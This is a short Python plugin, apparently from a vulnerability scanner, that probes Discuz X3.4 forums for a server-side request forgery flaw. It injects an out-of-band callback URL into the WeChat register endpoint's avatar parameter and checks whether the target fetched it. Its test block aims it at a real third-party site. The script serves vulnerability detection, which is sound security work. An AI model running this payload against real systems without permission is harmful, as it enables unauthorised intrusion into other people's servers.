#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

'''
https://zhuanlan.zhihu.com/p/51907363
https://www.seebug.org/vuldb/ssvid-97709
'''

import time
import random
from string import ascii_lowercase

def info(data):
    info = {
        "name": "discuz x3.4 ssrf",
        "info": "discuz x3.4 ssrf",
        "level": "high",
        "type": "ssrf",
    }
    return info

def prove(data):
    init(data,'discuz')
    if data['base_url']:
        dns = ceye_dns_api()
        url = data[
                  'base_url'] + "plugin.php?id=wechat:wechat&ac=wxregister&username=vov&avatar=%s&wxopenid=%s" %(dns,''.join([random.choice(ascii_lowercase) for _ in range(8)]))
        res = curl('get', url)
        if res != None :
            time.sleep(3)
            if ceye_verify_api(dns,'http'):
                data['flag'] = 1
                data['data'].append({"flag": url})
                data['res'].append({"info": url, "key": "discuz x3.4 ssrf"})
    return data


if __name__=='__main__':
    from script import init, curl,ceye_verify_api,ceye_dns_api
    print(prove({'url':'http://www.baidu.com','flag':-1,'data':[],'res':[]}))